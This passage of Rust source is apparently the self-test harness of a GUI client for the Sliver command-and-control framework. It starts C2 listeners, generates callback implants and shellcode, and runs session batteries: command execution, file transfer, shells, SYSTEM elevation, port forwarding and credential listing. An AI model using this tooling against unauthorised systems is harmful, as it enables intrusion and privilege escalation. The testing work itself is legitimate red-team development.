            let sid = c.get_sessions(commonpb::Empty {}).await.ok()
                .and_then(|r| r.into_inner().sessions.into_iter().find(|s| !want.is_empty() && (s.id.starts_with(&want) || s.name == want)).map(|s| s.id));
            battery_ext::seed(&mut rpc.clone(), sid.as_deref(), mode == "rm").await;
        }

        // Dev-only: edit-listener round trip (SLIVER_GUI_RELISTEN=<base port>): start an
        // mTLS listener, restart it in place, move it to base+1, try a port that is taken
        // (expects the original back), then attach a website to an HTTP listener on base+2.
        if let Some(base) = std::env::var("SLIVER_GUI_RELISTEN").ok().and_then(|v| v.parse::<u32>().ok()) {
            let (tx, rx) = crossbeam_channel::unbounded();
            let ectx = egui::Context::default();
            let mut started: Vec<u32> = Vec::new();
            let drain = |started: &mut Vec<u32>| -> Option<u32> {
                let mut last = None;
                for u in rx.try_iter() {
                    match u {
                        Update::ListenerStarted { job_id, spec } => { println!("[selftest]   started job {job_id}: {spec:?}"); started.push(job_id); last = Some(job_id); }
                        Update::Notice { ok, text } => println!("[selftest]   {} {text}", if ok { "ok  " } else { "FAIL" }),
                        _ => {}
                    }
                }
                last
            };
            let mtls = |port| ListenerSpec::Mtls { host: "0.0.0.0".into(), port };
            let site = std::env::var("SLIVER_GUI_RELISTEN_SITE").unwrap_or_else(|_| "files".into());
            println!("[selftest] relisten: start mTLS :{base}");
            start_listener(&mut c, mtls(base), &tx, &ectx).await;
            let mut id = drain(&mut started);
            for (label, spec, prev) in [
                ("restart in place", mtls(base), Some(mtls(base))),
                ("move port", mtls(base + 1), Some(mtls(base))),
                ("taken port 8888 (expect restore)", mtls(8888), Some(mtls(base + 1))),
            ] {
                let Some(j) = id else { println!("[selftest] relisten: no job to edit"); break };
                println!("[selftest] relisten: {label} (job {j})");
                restart_listener(&mut c, j, spec, prev, &tx, &ectx).await;
                id = drain(&mut started).or(id);
            }
            let http = |website: &str| ListenerSpec::Https { host: "0.0.0.0".into(), domain: String::new(), port: base + 2, secure: false, website: website.into(), tls: ListenerTls::Auto };
            println!("[selftest] relisten: HTTP :{} then attach website '{site}'", base + 2);
            start_listener(&mut c, http(""), &tx, &ectx).await;
            if let Some(j) = drain(&mut started) {
                restart_listener(&mut c, j, http(&site), Some(http("")), &tx, &ectx).await;
                drain(&mut started);
            }
            if let Ok(r) = c.get_jobs(commonpb::Empty {}).await {
                let mine: Vec<String> = r.into_inner().active.into_iter().filter(|j| (base..=base + 2).contains(&j.port) || started.contains(&j.id))
                    .map(|j| format!("{}:{}/{}", j.id, j.name, j.port)).collect();
                println!("[selftest] relisten: jobs now {mine:?}");
            }
            if std::env::var("SLIVER_GUI_RELISTEN_KEEP").is_err() {
                for j in &started { let _ = c.kill_job(clientpb::KillJobReq { id: *j }).await; }
                println!("[selftest] relisten: cleaned up jobs {started:?}");
            }
        }

        // Dev-only: HTTPS listener on a GUI-generated certificate (SLIVER_GUI_HTTPSCERT=<port>):
        // a missing key file must be refused, then the listener starts on the generated pair.
        if let Some(port) = std::env::var("SLIVER_GUI_HTTPSCERT").ok().and_then(|v| v.parse::<u32>().ok()) {
            use crate::app::certs;
            let https = |tls| ListenerSpec::Https { host: "0.0.0.0".into(), domain: String::new(), port, secure: true, website: String::new(), tls };
            match certs::cert_dir().ok_or("no data dir".to_string()).and_then(|d| certs::generate(&cfg.lhost, &[], 30, &d)) {
                Ok((crt, key)) => {
                    let (crt, key) = (crt.display().to_string(), key.display().to_string());
                    println!("[selftest] httpscert: generated {crt} fp={}", certs::fingerprint(&crt).unwrap_or_default());
                    let bad = launch_listener(&mut c, https(ListenerTls::Files { cert: crt.clone(), key: format!("{key}.missing") })).await;
                    println!("[selftest] httpscert: missing key → {}", match &bad { Ok(_) => "STARTED (wrong)".to_string(), Err(e) => format!("refused: {}", e.message()) });
                    match launch_listener(&mut c, https(ListenerTls::Files { cert: crt, key })).await {
                        Ok((j, text)) => println!("[selftest] httpscert: ok job {j}: {text}"),
                        Err(e) => println!("[selftest] httpscert: FAIL {}", e.message()),
                    }
                }
                Err(e) => println!("[selftest] httpscert: FAIL generate: {e}"),
            }
        }

        // Dev-only: hosted-file download integrity (SLIVER_GUI_HOSTDL=1).
        if std::env::var("SLIVER_GUI_HOSTDL").is_ok() {
            let mut rep = Report::default();
            battery_ext::hosted_download_check(&mut rpc.clone(), &cfg.lhost, &mut rep).await;
            rep.summary();
        }

        // Dev-only: delete one host record by hostname (SLIVER_GUI_HOSTRMTEST=<hostname>).
        if let Ok(host) = std::env::var("SLIVER_GUI_HOSTRMTEST") {
            let mut rep = Report::default();
            battery_ext::host_rm_check(&mut rpc.clone(), &host, &mut rep).await;
            rep.summary();
        }

        // Dev-only: read-only Windows registry/services checks on one session
        // (SLIVER_GUI_WINCHECKS=<session id prefix or name>).
        if let Ok(want) = std::env::var("SLIVER_GUI_WINCHECKS") {
            let sid = c.get_sessions(commonpb::Empty {}).await.ok()
                .and_then(|r| r.into_inner().sessions.into_iter().find(|s| s.id.starts_with(&want) || s.name == want).map(|s| s.id));
            match sid {
                Some(sid) => {
                    println!("\n==================== WINDOWS PANELS (session {}) ====================", short_id(&sid));
                    let mut rep = Report::default();
                    battery_ext::windows_checks(&mut rpc.clone(), &sid, &mut rep).await;
                    rep.summary();
                }
                None => println!("[selftest] no session matching {want}"),
            }
        }

        match c.get_beacons(commonpb::Empty {}).await {
            Ok(r) => {
                let b = r.into_inner().beacons;
                println!("[selftest] beacons: {}", b.len());
                for x in &b { println!("    beacon {} {} {}@{} {}/{}", &x.id[..x.id.len().min(8)], x.name, x.username, x.hostname, x.os, x.arch); }
            }
            Err(e) => println!("[selftest] get_beacons FAILED: {}", e.message()),
        }

        // Dev-only: remove beacon records — all (=1) or a comma-separated list of id prefixes.
        if let Ok(which) = std::env::var("SLIVER_GUI_RMBEACONS") {
            let prefixes: Vec<String> = which.split(',').map(|x| x.trim().to_string()).filter(|x| !x.is_empty() && x != "1").collect();
            if let Ok(r) = c.get_beacons(commonpb::Empty {}).await {
                for b in r.into_inner().beacons.into_iter().filter(|b| prefixes.is_empty() || prefixes.iter().any(|p| b.id.starts_with(p))) {
                    match c.rm_beacon(clientpb::Beacon { id: b.id.clone(), ..Default::default() }).await {
                        Ok(_) => println!("[selftest] rm_beacon {} OK", &b.id[..b.id.len().min(8)]),
                        Err(e) => println!("[selftest] rm_beacon {} FAILED: {}", &b.id[..b.id.len().min(8)], e.message()),
                    }
                }
            }
        }

        if let Ok(want) = std::env::var("SLIVER_GUI_BEACON") {
            let bid = if want == "auto" {
                c.get_beacons(commonpb::Empty {}).await.ok()
                    .and_then(|r| r.into_inner().beacons.into_iter().next().map(|b| b.id))
            } else {
                c.get_beacons(commonpb::Empty {}).await.ok()
                    .and_then(|r| r.into_inner().beacons.into_iter()
                        .find(|b| b.id == want || b.id.starts_with(&want) || b.name == want)
                        .map(|b| b.id))
                    .or(Some(want))
            };
            if let Some(bid) = bid { beacon_battery(&mut rpc.clone(), &bid).await; }
            else { println!("[selftest] no beacon available for battery"); }
        }
        match c.get_jobs(commonpb::Empty {}).await {
            Ok(r) => {
                let j = r.into_inner().active;
                println!("[selftest] jobs: {}", j.len());
                for x in &j { println!("    job [{}] {} {}/{}", x.id, x.name, x.protocol, x.port); }
            }
            Err(e) => println!("[selftest] get_jobs FAILED: {}", e.message()),
        }

        // Dev-only: kill jobs by id (comma-separated), for test cleanup.
        if let Ok(ids) = std::env::var("SLIVER_GUI_KILLJOB") {
            for id in ids.split(',').filter_map(|s| s.trim().parse::<u32>().ok()) {
                match c.kill_job(clientpb::KillJobReq { id }).await {
                    Ok(_) => println!("[selftest] killed job {id}"),
                    Err(e) => println!("[selftest] kill job {id} FAILED: {}", e.message()),
                }
            }
        }

        // Dev-only: start a WireGuard listener and leave it running (SLIVER_GUI_START_WG=<udp port>).
        if let Ok(port) = std::env::var("SLIVER_GUI_START_WG") {
            let port: u32 = port.parse().unwrap_or(51820);
            match c.start_wg_listener(clientpb::WgListenerReq { host: "0.0.0.0".into(), port, tun_ip: "100.64.0.1".into(), n_port: 8888, key_port: 1337 }).await {
                Ok(r) => println!("[selftest] started WireGuard listener on udp/{port} → job {}", r.into_inner().job_id),
                Err(e) => println!("[selftest] start_wg_listener FAILED: {}", e.message()),
            }
        }

        if let Ok(port) = std::env::var("SLIVER_GUI_START_MTLS") {
            let port: u32 = port.parse().unwrap_or(8888);
            match c.start_mtls_listener(clientpb::MtlsListenerReq { host: "0.0.0.0".into(), port }).await {
                Ok(r) => println!("[selftest] started mTLS listener on :{port} → job {}", r.into_inner().job_id),
                Err(e) => println!("[selftest] start_mtls_listener FAILED: {}", e.message()),
            }
        }

        // Dev-only: exercise the TCP stage listener (generate stage + serve).
        if let Ok(spec) = std::env::var("SLIVER_GUI_STAGE") {
            // Format: <bind_port>[=<c2 host:port>]
            let (bind, c2) = spec.split_once('=').unwrap_or((spec.as_str(), ""));
            let bind_port: u32 = bind.parse().unwrap_or(8443);
            let c2 = if c2.is_empty() { format!("{}:8888", cfg.lhost) } else { c2.to_string() };
            println!("[selftest] starting TCP stage listener on :{bind_port} (stage C2 mtls://{c2}) — compiling stage…");
            match stage_listener(&mut c, "0.0.0.0".into(), bind_port, c2).await {
                Ok((_, text)) => println!("[selftest] {text}"),
                Err(e) => println!("[selftest] stage listener FAILED: {}", e.message()),
            }
        }

        if std::env::var("SLIVER_GUI_GEN").is_ok() {
            let os = std::env::var("SLIVER_GUI_GEN_OS").unwrap_or_else(|_| "linux".into());
            let arch = std::env::var("SLIVER_GUI_GEN_ARCH").unwrap_or_else(|_| "amd64".into());
            let cb = std::env::var("SLIVER_GUI_GEN_LHOST").unwrap_or_else(|_| cfg.lhost.clone());
            let save = std::env::var("SLIVER_GUI_GEN_SAVE").unwrap_or_else(|_| "/tmp".into());
            let name = std::env::var("SLIVER_GUI_GEN_NAME").unwrap_or_else(|_| "gui-test".into());
            let ns = 1_000_000_000i64;
            let is_beacon = std::env::var("SLIVER_GUI_GEN_BEACON").is_ok();
            let interval = std::env::var("SLIVER_GUI_GEN_INTERVAL").ok().and_then(|v| v.parse().ok()).unwrap_or(5i64);
            // Dev-only: shellcode format + Donut entropy, to validate per-build variation.
            let shellcode = std::env::var("SLIVER_GUI_GEN_FORMAT").map(|v| v == "shellcode").unwrap_or(false);
            let entropy = std::env::var("SLIVER_GUI_GEN_ENTROPY").ok().and_then(|v| v.parse().ok()).unwrap_or(3u32);
            let config = clientpb::ImplantConfig {
                goos: os.clone(), goarch: arch.clone(),
                format: if shellcode { 1 } else { 2 },
                is_shellcode: shellcode,
                shellcode_config: if shellcode { Some(clientpb::ShellcodeConfig { entropy, compress: 1, ..Default::default() }) } else { None },
                is_beacon,
                beacon_interval: if is_beacon { interval * ns } else { 0 },
                c2: vec![clientpb::ImplantC2 { id: String::new(), priority: 0, url: format!("mtls://{cb}"), options: String::new() }],
                include_mtls: true,
                reconnect_interval: 60 * ns, max_connection_errors: 1000, poll_timeout: 360 * ns,
                template_name: "sliver".into(), httpc2_config_name: "default".into(),
                ..Default::default()
            };
            // Dev-only: a full C2 URL (mtls:// wg:// tcppivot:// namedpipe:// https://) overrides the mTLS default.
            let mut config = config;
            if let Ok(url) = std::env::var("SLIVER_GUI_GEN_C2") {
                config.c2 = vec![clientpb::ImplantC2 { url: url.clone(), ..Default::default() }];
                config.include_mtls = url.starts_with("mtls://");
                config.include_wg = url.starts_with("wg://");
                config.include_tcp = url.starts_with("tcppivot://");
                config.include_name_pipe = url.starts_with("namedpipe://");
                config.include_http = url.starts_with("http");
                if config.include_wg {
                    config.wg_key_exchange_port = 1337;
                    config.wg_tcp_comms_port = 8888;
                    match c.generate_unique_ip(commonpb::Empty {}).await {
                        Ok(r) => config.wg_peer_tun_ip = r.into_inner().ip,
                        Err(e) => println!("[selftest] wg tunnel ip FAILED: {}", e.message()),
                    }
                }
            }
            let cb = config.c2.first().map(|x| x.url.clone()).unwrap_or(cb);
            let kind = if is_beacon { format!("beacon ({interval}s)") } else { "session".into() };
            println!("[selftest] generating {os}/{arch} {kind} implant '{name}' ({cb}) — this compiles on the server, please wait…");
            match c.generate(clientpb::GenerateReq { config: Some(config), name: name.clone() }).await {
                Ok(r) => {
                    let g = r.into_inner();
                    if let Some(file) = g.file {
                        let fname = if file.name.is_empty() { format!("{name}.bin") } else { file.name.clone() };
                        let path = std::path::Path::new(&save).join(&fname);
                        match std::fs::write(&path, &file.data) {
                            Ok(_) => println!("[selftest] generated {} → {} ({} bytes)", g.implant_name, path.display(), file.data.len()),
                            Err(e) => println!("[selftest] generate write FAILED: {e}"),
                        }
                    } else { println!("[selftest] generate returned no file"); }
                }
                Err(e) => println!("[selftest] generate FAILED: {}", e.message()),
            }
        }
        println!("[selftest] done");
    });
}

/// Exercise the per-session RPCs and tunnel shell against a live implant.
/// Collects test outcomes and prints a summary.
#[derive(Default)]
struct Report { rows: Vec<(String, &'static str, String)> }
impl Report {
    fn rec(&mut self, name: &str, status: &'static str, detail: impl Into<String>) {
        let detail = detail.into();
        println!("  [{status}] {name}{}", if detail.is_empty() { String::new() } else { format!(" — {detail}") });
        use std::io::Write as _; let _ = std::io::stdout().flush();
        self.rows.push((name.into(), status, detail));
    }
    fn pass(&mut self, name: &str, d: impl Into<String>) { self.rec(name, "PASS", d); }
    fn fail(&mut self, name: &str, d: impl Into<String>) { self.rec(name, "FAIL", d); }
    fn na(&mut self, name: &str, d: impl Into<String>) { self.rec(name, "N/A ", d); }
    fn summary(&self) {
        let p = self.rows.iter().filter(|r| r.1 == "PASS").count();
        let f = self.rows.iter().filter(|r| r.1 == "FAIL").count();
        let n = self.rows.iter().filter(|r| r.1 == "N/A ").count();
        println!("\n========== TEST SUMMARY: {p} PASS, {f} FAIL, {n} N/A (of {}) ==========", self.rows.len());
        if f > 0 {
            println!("FAILURES:");
            for r in self.rows.iter().filter(|r| r.1 == "FAIL") { println!("  - {}: {}", r.0, r.2); }
        }
    }
}

/// Run the full feature battery against a live session + server.
async fn session_battery(c: &mut Rpc, sid: &str) {
    let mut rep = Report::default();
    let t = Target::session(sid);
    println!("\n==================== FULL BATTERY (session {}) ====================", &sid[..sid.len().min(8)]);

    // Detect the target OS so the battery uses platform-appropriate paths and
    // runs the Windows-only post-ex checks as real tests (not N/A) on Windows.
    let (is_win, orig_name) = c.get_sessions(commonpb::Empty {}).await.ok()
        .and_then(|r| r.into_inner().sessions.into_iter().find(|s| s.id == sid))
        .map(|s| (s.os.eq_ignore_ascii_case("windows"), s.name))
        .unwrap_or((false, "guitest".into()));
    println!("  (target OS: {})", if is_win { "windows" } else { "unix" });
    let (exec_path, exec_marker) = if is_win {
        ("C:\\Windows\\System32\\whoami.exe", "\\")
    } else { ("/usr/bin/id", "uid=") };
    let ls_path = if is_win { "C:\\Windows" } else { "/etc" };
    let (dir, file) = if is_win {
        ("C:\\Windows\\Temp\\gui_bat", "C:\\Windows\\Temp\\gui_bat\\probe.txt")
    } else { ("/tmp/gui_bat", "/tmp/gui_bat/probe.txt") };

    // ---- core exec / fs ----
    match c.execute(sliverpb::ExecuteReq { path: exec_path.into(), output: true, request: Some(t.request(30)), ..Default::default() }).await {
        Ok(r) => { let o = String::from_utf8_lossy(&r.into_inner().stdout).trim().to_string(); if o.contains(exec_marker) { rep.pass("execute", o) } else { rep.fail("execute", format!("unexpected: {o}")) } }
        Err(e) => rep.fail("execute", e.message()),
    }
    match c.ps(sliverpb::PsReq { request: Some(t.request(30)), ..Default::default() }).await {
        Ok(r) => { let n = r.into_inner().processes.len(); if n > 0 { rep.pass("ps", format!("{n} procs")) } else { rep.fail("ps", "0 processes") } }
        Err(e) => rep.fail("ps", e.message()),
    }
    match c.ls(sliverpb::LsReq { path: ls_path.into(), request: Some(t.request(30)) }).await {
        Ok(r) => { let n = r.into_inner().files.len(); if n > 0 { rep.pass("ls", format!("{ls_path}: {n} entries")) } else { rep.fail("ls", "0 entries") } }
        Err(e) => rep.fail("ls", e.message()),
    }

    // ---- file lifecycle: mkdir → upload → ls → download+verify → rm ----
    let payload = b"sliver-gui-battery\n".to_vec();
    match c.mkdir(sliverpb::MkdirReq { path: dir.into(), request: Some(t.request(30)) }).await {
        Ok(_) => rep.pass("mkdir", dir), Err(e) => rep.fail("mkdir", e.message()),
    }
    match c.upload(sliverpb::UploadReq { path: file.into(), data: payload.clone(), request: Some(t.request(60)), ..Default::default() }).await {
        Ok(_) => rep.pass("upload", file), Err(e) => rep.fail("upload", e.message()),
    }
    match c.ls(sliverpb::LsReq { path: dir.into(), request: Some(t.request(30)) }).await {
        Ok(r) => { let n = r.into_inner().files.len(); if n >= 1 { rep.pass("ls-after-upload", format!("{n} entries")) } else { rep.fail("ls-after-upload", "file not present") } }
        Err(e) => rep.fail("ls-after-upload", e.message()),
    }
    match c.download(sliverpb::DownloadReq { path: file.into(), request: Some(t.request(60)), ..Default::default() }).await {
        Ok(r) => {
            let d = r.into_inner();
            let bytes = if d.encoder == "gzip" { gunzip(&d.data) } else { d.data };
            if bytes == payload { rep.pass("download+verify", format!("{} bytes, roundtrip exact", bytes.len())) }
            else { rep.fail("download+verify", format!("mismatch: got {:?}", String::from_utf8_lossy(&bytes))) }
        }
        Err(e) => rep.fail("download+verify", e.message()),
    }
    match c.rm(sliverpb::RmReq { path: dir.into(), recursive: true, force: true, request: Some(t.request(30)) }).await {
        Ok(_) => rep.pass("rm -rf", dir), Err(e) => rep.fail("rm -rf", e.message()),
    }

    // ---- info modules (cross-platform) ----
    match c.ifconfig(sliverpb::IfconfigReq { request: Some(t.request(30)) }).await {
        Ok(r) => { let n = r.into_inner().net_interfaces.len(); if n > 0 { rep.pass("ifconfig", format!("{n} ifaces")) } else { rep.fail("ifconfig", "0") } }
        Err(e) => rep.fail("ifconfig", e.message()),
    }
    match c.netstat(sliverpb::NetstatReq { tcp: true, udp: true, ip4: true, ip6: true, listening: true, request: Some(t.request(30)) }).await {
        Ok(r) => { let n = r.into_inner().entries.len(); if n > 0 { rep.pass("netstat", format!("{n} entries")) } else { rep.fail("netstat", "0") } }
        Err(e) => rep.fail("netstat", e.message()),
    }
    match c.get_env(sliverpb::EnvReq { name: String::new(), request: Some(t.request(30)) }).await {
        Ok(r) => { let n = r.into_inner().variables.len(); if n > 0 { rep.pass("env", format!("{n} vars")) } else { rep.fail("env", "0") } }
        Err(e) => rep.fail("env", e.message()),
    }
    // whoami / getprivs — may be Windows-centric; report whatever the implant says.
    match c.current_token_owner(sliverpb::CurrentTokenOwnerReq { request: Some(t.request(30)) }).await {
        Ok(r) => rep.pass("whoami", r.into_inner().output.trim().to_string()),
        Err(e) => rep.na("whoami", format!("not supported here: {}", e.message())),
    }
    match c.get_privs(sliverpb::GetPrivsReq { request: Some(t.request(30)) }).await {
        Ok(r) => { let v = r.into_inner(); rep.pass("getprivs", format!("proc {} integrity {}", v.process_name, v.process_integrity)) }
        Err(e) => rep.na("getprivs", format!("not supported here: {}", e.message())),
    }

    // ---- screenshot (likely N/A on a headless linux implant) ----
    match tokio::time::timeout(Duration::from_secs(20), c.screenshot(sliverpb::ScreenshotReq { request: Some(t.request(15)) })).await {
        Ok(Ok(r)) => { let n = r.into_inner().data.len(); if n > 0 { rep.pass("screenshot", format!("{n} bytes")) } else { rep.na("screenshot", "no display on target") } }
        Ok(Err(e)) => rep.na("screenshot", format!("no display on target: {}", e.message())),
        Err(_) => rep.na("screenshot", "timed out (no display)"),
    }

    // ---- extensions listing (implant handler is platform/build dependent) ----
    match c.list_extensions(sliverpb::ListExtensionsReq { request: Some(t.request(30)) }).await {
        Ok(r) => rep.pass("list-extensions", format!("{} loaded", r.into_inner().names.len())),
        Err(e) if e.message().contains("unknown message type") => rep.na("list-extensions", "handler not in this implant build"),
        Err(e) => rep.fail("list-extensions", e.message()),
    }

    // ---- rename round-trip ----
    match c.rename(clientpb::RenameReq { session_id: sid.into(), beacon_id: String::new(), name: "GUI_RENAMED".into() }).await {
        Ok(_) => {
            let ok = c.get_sessions(commonpb::Empty {}).await.ok()
                .map(|r| r.into_inner().sessions.into_iter().any(|s| s.id == sid && s.name == "GUI_RENAMED")).unwrap_or(false);
            if ok { rep.pass("rename", "name applied + verified") } else { rep.fail("rename", "name did not change") }
            let _ = c.rename(clientpb::RenameReq { session_id: sid.into(), beacon_id: String::new(), name: orig_name.clone() }).await;
        }
        Err(e) => rep.fail("rename", e.message()),
    }

    // ---- interactive shells: raw + PTY ----
    match shell_roundtrip(c, sid, false, is_win).await {
        Ok(d) => rep.pass("shell(raw)", d), Err(e) => rep.fail("shell(raw)", e),
    }
    match shell_roundtrip(c, sid, true, is_win).await {
        Ok(d) => rep.pass("shell(pty)", d), Err(e) => rep.fail("shell(pty)", e),
    }

    // ---- Windows-only post-ex ----
    if is_win {
        // getsystem: attempt elevation to NT AUTHORITY\SYSTEM. Needs the implant
        // to already be high-integrity; a handled failure still exercises the
        // RPC path, so report it non-fatally.
        let gs_config = session_build_info(c, sid).await
            .map(|(os, arch, c2)| getsystem_config(&os, &arch, &c2));
        match c.get_system(clientpb::GetSystemReq {
            request: Some(t.request(60)), hosting_process: "spoolsv.exe".into(),
            config: gs_config, ..Default::default()
        }).await {
            Ok(r) => match r.into_inner().response {
                Some(x) if x.err.is_empty() => rep.pass("getsystem", "got SYSTEM (new session should appear)"),
                Some(x) => rep.na("getsystem", format!("not elevated / rejected: {}", x.err)),
                None => rep.pass("getsystem", "RPC ok (no response payload)"),
            },
            Err(e) => rep.na("getsystem", format!("not elevated / rejected: {}", e.message())),
        }
        // These need an operator-supplied input (payload bytes / target PID /
        // credentials), so they're driven from the GUI Modules tab, not headless.
        rep.na("execute-assembly", "needs an assembly to run — test via GUI Modules");
        rep.na("sideload", "needs a DLL/payload — test via GUI Modules");
        rep.na("spawndll", "needs a reflective DLL — test via GUI Modules");
        rep.na("migrate", "needs a target PID — test via GUI Modules");
        rep.na("impersonate", "needs a logged-on user token — test via GUI Modules");
        rep.na("make-token", "needs credentials — test via GUI Modules");
    } else {
        for m in ["execute-assembly", "sideload", "spawndll", "migrate", "getsystem", "impersonate", "make-token"] {
            rep.na(m, "Windows-only; not applicable to this implant");
        }
    }

    // ---- reverse port-forward listener lifecycle (server-managed) ----
    match start_rport_fwd(c, sliverpb::RportFwdStartListenerReq {
        bind_address: "0.0.0.0".into(), bind_port: 18080,
        forward_address: "127.0.0.1".into(), forward_port: 9000,
        keep_alive: -1, authorization_id: String::new(), request: Some(t.request(30)),
    }).await {
        Ok(r) => {
            let id = r.into_inner().id;
            rep.pass("rportfwd-start", format!("listener id {id} on implant :18080"));
            match c.stop_rport_fwd_listener(sliverpb::RportFwdStopListenerReq { id, request: Some(t.request(30)) }).await {
                Ok(_) => rep.pass("rportfwd-stop", "listener stopped"),
                Err(e) => rep.fail("rportfwd-stop", e.message()),
            }
        }
        Err(e) => rep.na("rportfwd", format!("server/implant rejected: {}", e.message())),
    }

    // ---- extended features: processes, file ops, hosts/IOCs, pivot listeners ----
    battery_ext::session_checks(c, sid, is_win, &mut rep).await;
    battery_admin::session_upkeep(c, sid, is_win, &mut rep).await;
    let is_wg = c.get_sessions(commonpb::Empty {}).await.ok()
        .and_then(|r| r.into_inner().sessions.into_iter().find(|s| s.id == sid)).is_some_and(|s| s.transport == "wg");
    if is_wg {
        battery_ext::wg_checks(c, sid, &mut rep).await;
    } else {
        rep.na("wg-tunnels", "session is not on the wg transport");
    }
    if is_win {
        battery_ext::windows_checks(c, sid, &mut rep).await;
    } else {
        for m in ["registry-list", "registry-values", "registry-read", "services"] {
            rep.na(m, "Windows-only; not applicable to this implant");
        }
    }

    // ---- global collections + listener lifecycle ----
    global_battery(c, &mut rep).await;
    battery_ext::global_checks(c, &mut rep).await;

    // ---- kill: destructive, so opt-in only (SLIVER_GUI_KILLTEST=1). Kills the session
    //      under test (last step), never another operator's or test's session ----
    if std::env::var("SLIVER_GUI_KILLTEST").is_err() {
        rep.na("kill-session", "skipped (set SLIVER_GUI_KILLTEST=1 to enable — it kills the tested session)");
    } else {
        match c.kill(sliverpb::KillReq { force: true, request: Some(t.request(30)) }).await {
            Ok(_) => {
                tokio::time::sleep(Duration::from_secs(2)).await;
                let gone = c.get_sessions(commonpb::Empty {}).await.ok()
                    .map(|r| !r.into_inner().sessions.iter().any(|s| s.id == sid && !s.is_dead)).unwrap_or(false);
                if gone { rep.pass("kill-session", "tested session terminated + verified") } else { rep.fail("kill-session", "session still alive after kill") }
            }
            // The implant exits before it can reply, which can surface as a transport error.
            Err(e) => {
                tokio::time::sleep(Duration::from_secs(2)).await;
                let gone = c.get_sessions(commonpb::Empty {}).await.ok()
                    .map(|r| !r.into_inner().sessions.iter().any(|s| s.id == sid && !s.is_dead)).unwrap_or(false);
                if gone { rep.pass("kill-session", "tested session terminated + verified") } else { rep.fail("kill-session", e.message()) }
            }
        }
    }

    rep.summary();
}

/// Beacon tasking: queue an async command, wait for a checkin, retrieve + decode
/// the result. Validates the GetBeaconTasks / GetBeaconTaskContent path too.
async fn beacon_battery(c: &mut Rpc, bid: &str) {
    use prost::Message as _;
    let mut rep = Report::default();
    println!("\n==================== BEACON BATTERY (beacon {}) ====================", &bid[..bid.len().min(8)]);
    let t = Target::beacon(bid);

    // Pick a platform-appropriate probe command + expected marker.
    let (is_win, cadence) = c.get_beacons(commonpb::Empty {}).await.ok()
        .and_then(|r| r.into_inner().beacons.into_iter().find(|b| b.id == bid))
        .map(|b| (b.os.eq_ignore_ascii_case("windows"), (b.interval + b.jitter) / 1_000_000_000)).unwrap_or((false, 5));
    // Poll long enough for at least two check-ins at this beacon's cadence.
    let polls = (cadence as usize * 2 / 2 + 15).max(15);
    let (exec_path, exec_marker) = if is_win {
        ("C:\\Windows\\System32\\whoami.exe", "\\")
    } else { ("/usr/bin/id", "uid=") };
    println!("  (target OS: {})", if is_win { "windows" } else { "unix" });

    let mut task_id = String::new();
    match c.execute(sliverpb::ExecuteReq { path: exec_path.into(), output: true, request: Some(t.request(30)), ..Default::default() }).await {
        Ok(r) => {
            let resp = r.into_inner().response.unwrap_or_default();
            task_id = resp.task_id.clone();
            if resp.r#async { rep.pass("beacon-execute-queued", format!("task accepted (async, id {})", &task_id[..task_id.len().min(8)])) }
            else { rep.fail("beacon-execute-queued", "response not marked async") }
        }
        Err(e) => rep.fail("beacon-execute-queued", e.message()),
    }

    // Poll for THIS task to complete on the next checkin (match by id so a stale
    // completed task from a prior run isn't picked up).
    let mut done = None;
    for _ in 0..polls {
        tokio::time::sleep(Duration::from_secs(2)).await;
        if let Ok(r) = c.get_beacon_tasks(clientpb::Beacon { id: bid.into(), ..Default::default() }).await {
            let tasks = r.into_inner().tasks;
            let hit = tasks.into_iter().find(|t| t.state == "completed"
                && (task_id.is_empty() || t.id == task_id));
            if let Some(tk) = hit { done = Some(tk); break; }
        }
    }
    match done {
        Some(tk) => {
            rep.pass("beacon-task-completed", format!("{} ({})", tk.description, tk.state));
            match c.get_beacon_task_content(clientpb::BeaconTask { id: tk.id.clone(), ..Default::default() }).await {
                Ok(r) => {
                    let full = r.into_inner();
                    match sliverpb::Execute::decode(full.response.as_slice()) {
                        Ok(ex) => {
                            let out = String::from_utf8_lossy(&ex.stdout).trim().to_string();
                            if out.contains(exec_marker) { rep.pass("beacon-task-result", out) }
                            else { rep.fail("beacon-task-result", format!("unexpected output: {out:?}")) }
                        }
                        Err(e) => rep.fail("beacon-task-result-decode", e.to_string()),
                    }
                }
                Err(e) => rep.fail("beacon-task-content", e.message()),
            }
        }
        None => rep.fail("beacon-task-completed", format!("no completed task within ~{}s", polls * 2)),
    }
    battery_ext::beacon_reconfigure(c, bid, &mut rep).await;
    battery_admin::beacon_upkeep(c, bid, polls, &mut rep).await;
    rep.summary();
}

/// First segment of a UUID, for compact test output.
fn short_id(id: &str) -> &str {
    id.split('-').next().unwrap_or(id)
}

/// Global (non-session) RPCs: collections + listener lifecycle.
async fn global_battery(c: &mut Rpc, rep: &mut Report) {
    match c.loot_all(commonpb::Empty {}).await {
        Ok(r) => rep.pass("loot_all", format!("{} items", r.into_inner().loot.len())),
        Err(e) => rep.fail("loot_all", e.message()),
    }
    match c.creds(commonpb::Empty {}).await {
        Ok(r) => rep.pass("creds", format!("{} creds", r.into_inner().credentials.len())),
        Err(e) => rep.fail("creds", e.message()),
    }
    match c.pivot_graph(commonpb::Empty {}).await {
        Ok(r) => rep.pass("pivot_graph", format!("{} roots", r.into_inner().children.len())),
        Err(e) => rep.fail("pivot_graph", e.message()),
    }
    // HTTPS listener lifecycle (use a high port unlikely to collide with any
    // persistent listener in the server's DB).
    match c.start_https_listener(clientpb::HttpListenerReq { host: "0.0.0.0".into(), port: 9443, secure: true, ..Default::default() }).await {
        Ok(r) => {
            let jid = r.into_inner().job_id;
            rep.pass("start-https-listener", format!("job {jid}"));
            match c.kill_job(clientpb::KillJobReq { id: jid }).await {
                Ok(_) => rep.pass("kill-job(https)", format!("job {jid}")), Err(e) => rep.fail("kill-job(https)", e.message()),
            }
        }
        Err(e) => rep.fail("start-https-listener", e.message()),
    }
    // Hosted-file (website) lifecycle: add content, read it back, remove.
    let site = "sliver-gui-test".to_string();
    let body = b"sliver-gui hosted file test\n".to_vec();
    let content = clientpb::WebContent { path: "/gui-test.txt".into(), content_type: "text/plain".into(), size: body.len() as u64, content: body.clone(), replace_content: true, ..Default::default() };
    match c.website_add_content(clientpb::WebsiteAddContent { name: site.clone(), contents: [("/gui-test.txt".to_string(), content)].into() }).await {
        Ok(_) => {
            rep.pass("website-add-content", format!("{site}/gui-test.txt"));
            match list_websites(c).await {
                Ok(sites) => match sites.iter().find(|w| w.name == site).and_then(|w| w.contents.values().find(|x| x.path == "/gui-test.txt")) {
                    Some(x) => rep.pass("websites(list)", format!("{} sites, test file {} bytes", sites.len(), x.size)),
